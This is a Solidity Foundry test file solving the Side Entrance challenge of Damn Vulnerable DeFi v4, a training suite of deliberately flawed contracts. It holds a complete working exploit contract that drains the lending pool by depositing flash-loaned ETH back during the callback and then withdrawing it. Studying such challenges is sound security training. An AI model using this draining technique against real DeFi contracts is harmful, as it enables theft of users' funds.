// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";



//NOTE (tina):create an exploit contract
contract SideEntranceExploit  {
    SideEntranceLenderPool private pool;
    address private recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function exploit() external {
        //step 1: call flashLoan() with the pool balance
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);

        //step 3:withdraw our deposited balance and send to recovery
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    //step 2: after step 1, this gets called during the flash loan
    function execute() external payable {
        //deposit the borrowed ETH back into the pool to satisfy the payback check and to get the balance that is required in withdraw()
        pool.deposit{value: msg.value}();
    }

    //allow this contract to receive ETH
    receive() external payable {}
}





contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        //NOTE (tina): exploit contract is at the top of this test file👆👆👆
        
        // Deploy the exploit contract
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);

        // Execute the exploit
        exploit.exploit();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(
            recovery.balance,
            ETHER_IN_POOL,
            "Not enough ETH in recovery account"
        );
    }
}

